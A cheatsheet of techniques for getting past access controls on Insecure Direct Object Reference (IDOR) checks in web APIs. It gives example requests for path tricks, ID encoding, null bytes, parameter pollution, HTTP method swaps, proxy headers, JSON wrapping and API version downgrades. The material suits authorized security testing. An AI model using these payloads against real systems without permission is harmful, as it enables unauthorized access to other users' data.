# IDOR 403 Bypass Cheatsheet

This cheatsheet outlines common techniques used to test for and bypass Insecure Direct Object Reference (IDOR) access controls, particularly when an initial request returns a **403 Forbidden** or **404 Not Found** error.

## Initial State

The goal is to move from a forbidden state to success:

* **Our Profile (Attacker):** `/api/v5/users/10` $\rightarrow$ `200 OK`
* **Target Profile (Victim):** `/api/v5/users/9` $\rightarrow$ `403` or `404`

---

## 1. Path & URL Manipulation Techniques

These methods test how the server processes the requested path structure and normalization.

### 1.1 Path Normalization & Redundancy
* `/api/v5/users/9/` (**Trailing Slash**)
* `/api/v5/users//9` (**Double Slashes**)
* `/api/v5/users/users//9` (**Offset Path**)
* `/api/v5/users/9/details` (**Sub-Endpoint**)
* `/api/v5/users/9/orders` (**Sub-Endpoint**)
* `POST /users/delete/my_id/../victim_id` (**Path Traversal Sequence**)
* `POST /workspaces/60b64f71adf0d3543cfd8229/../60c30f178747147d9acd89ba/users?sendEmail=true` (**Path Traversal with two IDs**)

### 1.2 Case Sensitivity
* `GET /admin/profile` $\rightarrow$ `401`
* `GET /Admin/profile` $\rightarrow$ `200`
* `GET /ADMIN/profile` $\rightarrow$ `200`

---

## 2. ID Encoding & Format Abuse

These methods test how the server interprets the value of the ID itself or its surrounding characters.

### 2.1 Type Confusion & Alternate Formats
* `/api/v5/users/9'` (**Single Quote**)
* `/api/v5/users/9"` (**Double Quote**)
* `/api/v5/users/9a` (**Append Character**)
* `/api/v5/users/09` (**Leading Zeros**)
* `/api/v5/users/0x9` (**Alternate Base/Format**)
* `GET /file?id=302` (**Swap Non-Numeric with Numeric ID**)

### 2.2 Control Character & Encoding Abuse
* `/api/v5/users/9%00` (**Null Termination**)
* `POST /workspaces/60c30f178747147d9acd89ba%00/users?sendEmail=true` (**URL Encoded Null in Path**)
* `/api/v5/users/9%20` (**Encoded Space**)
* `GET /user_data/2341.json` (**Change File Type**)

### 2.3 Encoded/Hashed IDs
* Try **decoding** the ID (e.g., Base64, MD5) if it appears hashed or encoded, then manipulate the plaintext value.
* **Example:** `GET /GetUser/dmljdGltQG1haWwuY29t` (Base64 ID)

---

## 3. Parameter & Multi-ID Abuse

These methods test using multiple IDs, different parameters, or wildcard values to confuse the access control logic.

### 3.1 Multi-ID Submission (Path or Query)
* `/api/v5/users/9,8`
* `/api/v5/users/10,9` (**Attacker's ID first**)
* `/api/v5/users/10.9`
* `?ID=10&ID=9` (**HTTP Parameter Pollution**)
* `?ID=10,9`
* `GET /api_v1/messages?user_id=attacker_id&user_id=victim_id` (**HTTP Parameter Pollution**)

### 3.2 Parameter Replacement & Addition
* **Replace Parameter Names:**
    * **Instead of:** `GET /api/albums?album_id=<album id>`
    * **Try:** `GET /api/albums?account_id=<account id>`
* **Add Missing Parameter (using Attacker's ID):**
    * `GET /api_v1/messages?user_id=victim_uuid` (If `user_id` is not present by default)

### 3.3 Wildcard Access
* `GET /api/users/*` (**Wildcard in Path**)
* `POST /workspaces/*/users?sendEmail=true` (**Wildcard for ID**)

---

## 4. HTTP Method & Header Alteration

These methods test if access controls are method-specific or bypassable via proxy headers.

### 4.1 Change HTTP Method
* `GET /users/delete/victim_id` $\rightarrow$ `403`
* `POST /users/delete/victim_id` $\rightarrow$ `200`
* `PUT /workspaces/<workspace_ID>/users?sendEmail=true`
* `PATCH /workspaces/<workspace_ID>/users?sendEmail=true`
* `DELETE /workspaces/<workspace_ID>/users?sendEmail=true`

### 4.2 Header or Proxy Based Bypass
* `X-Original-URL: /api/v5/users/9`
* `X-Forwarded-For: 127.0.0.1`

### 4.3 Change Content-Type
* Change `Content-Type: application/json` to `Content-Type: application/xml`

---

## 5. Body & Data Structure Manipulation

These methods apply to request bodies (POST/PUT) and exploit how data structures are parsed, specifically targeting the ID/Object Reference within the body.

### 5.1 JSON Parameter Pollution (JPP)
* `{"userid":1234,"userid":2542}` (**Duplicate keys in JSON body**)

### 5.2 Wrapping ID
* **Wrap with Array:**
    * **Path ID:** `POST /workspaces/[60c30f178747147d9acd89ba]/users?sendEmail=true`
    * **Body ID (if normally a scalar):** `{"userid":[123]}` (Instead of `{"userid":123}`)
    * **Nested Array:** `{"emails":[["random@gmail.com"]],"captchaValue":"_"}` (If the ID/value is expected as an array)
* **Wrap with JSON Object:**
    * **Path ID:** `POST /workspaces/{"id":"60c30f178747147d9acd89ba"}/users?sendEmail=true`
    * **Body ID (if normally a scalar):** `{"userid":{"userid":123}}` (Instead of `{"userid":123}`)
    * **Nested Object:** `{"emails":[{"email": "random@gmail.com"}],"captchaValue":"_"}` (If the ID/value is expected as a simple value)

---

## 6. Versioning & External Exposure

These methods test for outdated or publicly visible APIs that may lack the current access controls.

### 6.1 API Version Downgrading
* `/ABI/version4/users/9`
* `/ABI/version3/users/9`
* `/ABI/version2/users/9`
* `POST /v1/workspaces/<workspace_ID>/users?sendEmail=true`
* `POST /v2/workspaces/<workspace_ID>/users?sendEmail=true`

### 6.2 GraphQL & External Search
* Look for IDOR vectors in GraphQL queries: `GET /graphql` or `GET /graphql.php?query=`
* Use Google Dorking to find indexed endpoints: `site:target.com inurl:user_id=`
